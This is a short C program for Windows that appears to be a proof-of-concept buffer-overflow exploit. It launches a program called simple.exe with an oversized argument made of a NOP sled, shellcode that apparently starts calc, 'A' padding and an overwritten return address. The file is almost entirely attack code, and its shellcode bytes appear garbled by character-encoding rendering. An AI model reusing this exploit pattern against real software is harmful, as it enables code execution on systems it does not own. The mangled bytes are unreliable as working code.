#include <stdio.h>
#include <windows.h>

int main(int argc, char **argv)
{
	char payload [] =	"simple.exe ÉÉÉÉÉÉÉÉÉÉÉÉ1╔QhcalcT╕╟ô┬w ╨AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
						"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA⌠■‼";

	WinExec(payload, 0);
	return (0);
}
